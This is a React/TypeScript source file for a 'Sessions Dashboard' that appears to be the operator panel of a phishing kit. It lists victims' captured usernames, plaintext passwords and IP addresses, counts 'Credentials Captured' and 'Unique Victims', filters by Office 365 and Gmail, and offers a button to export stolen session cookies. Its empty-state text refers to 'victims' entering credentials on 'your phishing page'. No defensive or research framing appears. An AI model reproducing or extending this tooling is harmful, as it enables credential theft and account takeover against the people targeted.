import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import StatsCard from "@/components/stats-card";
import { apiRequest } from "@/lib/queryClient";
import { 
  Download, 
  Trash2, 
  RefreshCw, 
  BarChart3, 
  Lock, 
  CheckCircle, 
  Users,
  Search,
  X
} from "lucide-react";
import { Session } from "@shared/schema";

interface DashboardStats {
  totalSessions: number;
  credentialsCaptured: number;
  completeSessions: number;
  uniqueVictims: number;
}

export default function SessionsPage() {
  const [searchTerm, setSearchTerm] = useState("");
  const [showFilter, setShowFilter] = useState("all");
  const [platformFilter, setPlatformFilter] = useState("all");
  const { toast } = useToast();
  const queryClient = useQueryClient();

  // Fetch dashboard stats
  const { data: stats, isLoading: statsLoading } = useQuery<DashboardStats>({
    queryKey: ["/api/dashboard/stats"],
  });

  // Fetch sessions
  const { data: sessions = [], isLoading: sessionsLoading, refetch } = useQuery<Session[]>({
    queryKey: ["/api/sessions"],
  });

  // Clear all data mutation
  const clearDataMutation = useMutation({
    mutationFn: () => apiRequest("DELETE", "/api/sessions"),
    onSuccess: () => {
      toast({
        title: "Success",
        description: "All session data has been cleared.",
      });
      queryClient.invalidateQueries({ queryKey: ["/api/sessions"] });
      queryClient.invalidateQueries({ queryKey: ["/api/dashboard/stats"] });
    },
    onError: () => {
      toast({
        title: "Error",
        description: "Failed to clear session data.",
        variant: "destructive",
      });
    },
  });

  const filteredSessions = sessions.filter((session: Session) => {
    const matchesSearch = !searchTerm || 
      session.username?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      session.ipAddress.toLowerCase().includes(searchTerm.toLowerCase());
    
    const matchesShow = showFilter === "all" || 
      (showFilter === "complete" && session.status === "complete") ||
      (showFilter === "failed" && session.status === "failed");
    
    return matchesSearch && matchesShow;
  });

  const formatTimestamp = (timestamp: string) => {
    const date = new Date(timestamp);
    return {
      formatted: date.toLocaleString(),
      relative: getRelativeTime(date),
    };
  };

  const getRelativeTime = (date: Date) => {
    const now = new Date();
    const diffInHours = Math.floor((now.getTime() - date.getTime()) / (1000 * 60 * 60));
    
    if (diffInHours < 1) return "Just now";
    if (diffInHours < 24) return `${diffInHours}h ago`;
    return `${Math.floor(diffInHours / 24)}d ago`;
  };

  const getStatusBadge = (status: string, completionPercentage?: number) => {
    if (status === "complete") {
      return (
        <Badge className="bg-green-500/20 text-green-400 hover:bg-green-500/30">
          COMPLETE {completionPercentage ? `(${completionPercentage}%)` : ""}
        </Badge>
      );
    }
    if (status === "failed") {
      return (
        <Badge className="bg-red-500/20 text-red-400 hover:bg-red-500/30">
          FAILED
        </Badge>
      );
    }
    return (
      <Badge className="bg-yellow-500/20 text-yellow-400 hover:bg-yellow-500/30">
        PENDING
      </Badge>
    );
  };

  return (
    <div className="h-full overflow-y-auto">
      {/* Page Header */}
      <div className="bg-card border-b border-border px-6 py-4">
        <div className="flex items-center justify-between">
          <h1 className="text-2xl font-bold text-foreground">Sessions Dashboard</h1>
          <div className="flex items-center space-x-3">
            <Button 
              variant="secondary" 
              size="sm"
              data-testid="button-export-cookies"
            >
              <Download className="w-4 h-4 mr-2" />
              Export Cookies
            </Button>
            <Button 
              variant="destructive" 
              size="sm"
              onClick={() => clearDataMutation.mutate()}
              disabled={clearDataMutation.isPending}
              data-testid="button-clear-data"
            >
              <Trash2 className="w-4 h-4 mr-2" />
              Clear All Data
            </Button>
            <Button 
              variant="default" 
              size="sm"
              onClick={() => refetch()}
              data-testid="button-refresh"
            >
              <RefreshCw className="w-4 h-4 mr-2" />
              Refresh
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        {/* Search Filters */}
        <Card className="mb-6">
          <CardContent className="p-4">
            <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
              <div>
                <label className="block text-sm font-medium text-foreground mb-2">Search:</label>
                <Input
                  placeholder="Regex or text search"
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  data-testid="input-search"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-foreground mb-2">Show:</label>
                <Select value={showFilter} onValueChange={setShowFilter} data-testid="select-show">
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All Sessions</SelectItem>
                    <SelectItem value="complete">Complete Sessions</SelectItem>
                    <SelectItem value="failed">Failed Sessions</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <label className="block text-sm font-medium text-foreground mb-2">Platform:</label>
                <Select value={platformFilter} onValueChange={setPlatformFilter} data-testid="select-platform">
                  <SelectTrigger>
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All Platforms</SelectItem>
                    <SelectItem value="office365">Office 365</SelectItem>
                    <SelectItem value="gmail">Gmail</SelectItem>
                    <SelectItem value="custom">Custom</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="flex items-end space-x-2">
                <Button data-testid="button-search">
                  <Search className="w-4 h-4 mr-2" />
                  Search
                </Button>
                <Button 
                  variant="secondary"
                  onClick={() => {
                    setSearchTerm("");
                    setShowFilter("all");
                    setPlatformFilter("all");
                  }}
                  data-testid="button-clear-filters"
                >
                  <X className="w-4 h-4 mr-2" />
                  Clear
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          <StatsCard
            title="Total Sessions"
            value={statsLoading ? "..." : stats?.totalSessions || 0}
            icon={BarChart3}
            color="blue"
          />
          <StatsCard
            title="Credentials Captured"
            value={statsLoading ? "..." : stats?.credentialsCaptured || 0}
            icon={Lock}
            color="orange"
          />
          <StatsCard
            title="Complete Sessions"
            value={statsLoading ? "..." : stats?.completeSessions || 0}
            icon={CheckCircle}
            color="green"
          />
          <StatsCard
            title="Unique Victims"
            value={statsLoading ? "..." : stats?.uniqueVictims || 0}
            icon={Users}
            color="purple"
          />
        </div>

        {/* Sessions Table */}
        <Card>
          <div className="px-6 py-4 border-b border-border">
            <h3 className="text-lg font-semibold text-foreground">
              Captured Sessions (sorted by most recent)
            </h3>
          </div>
          <div className="overflow-x-auto">
            {sessionsLoading ? (
              <div className="p-8 text-center">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary mx-auto"></div>
                <p className="text-muted-foreground mt-2">Loading sessions...</p>
              </div>
            ) : filteredSessions.length === 0 ? (
              <div className="p-8 text-center">
                <div className="w-16 h-16 mx-auto mb-4 bg-muted/30 rounded-lg flex items-center justify-center">
                  <BarChart3 className="w-8 h-8 text-muted-foreground" />
                </div>
                <h4 className="text-lg font-semibold text-foreground mb-2">No sessions captured yet</h4>
                <p className="text-muted-foreground">
                  Sessions will appear here once victims enter their credentials on your phishing page.
                </p>
              </div>
            ) : (
              <table className="w-full">
                <thead className="bg-muted/30">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-muted-foreground uppercase tracking-wider">
                      Timestamp
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-muted-foreground uppercase tracking-wider">
                      Username
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-muted-foreground uppercase tracking-wider">
                      Password
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-muted-foreground uppercase tracking-wider">
                      IP Address
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-muted-foreground uppercase tracking-wider">
                      Status
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-muted-foreground uppercase tracking-wider">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border">
                  {filteredSessions.map((session: Session) => {
                    const timestamp = formatTimestamp(session.createdAt ? new Date(session.createdAt).toISOString() : new Date().toISOString());
                    return (
                      <tr key={session.id} className="hover:bg-muted/20 transition-colors" data-testid={`row-session-${session.id}`}>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <div className="text-sm text-foreground">{timestamp.formatted}</div>
                          <div className="text-xs text-muted-foreground">{timestamp.relative}</div>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-foreground">
                          {session.username || "N/A"}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-foreground">
                          {session.password || "N/A"}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-foreground">
                          {session.ipAddress}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          {getStatusBadge(session.status, session.completionPercentage || 0)}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm space-x-2">
                          <Button variant="link" size="sm" className="text-blue-400 hover:text-blue-300 p-0" data-testid={`button-details-${session.id}`}>
                            Details
                          </Button>
                          <Button variant="link" size="sm" className="text-green-400 hover:text-green-300 p-0" data-testid={`button-cookies-${session.id}`}>
                            {session.status === "complete" ? "Office" : "Cookies"}
                          </Button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            )}
          </div>
        </Card>
      </div>
    </div>
  );
}
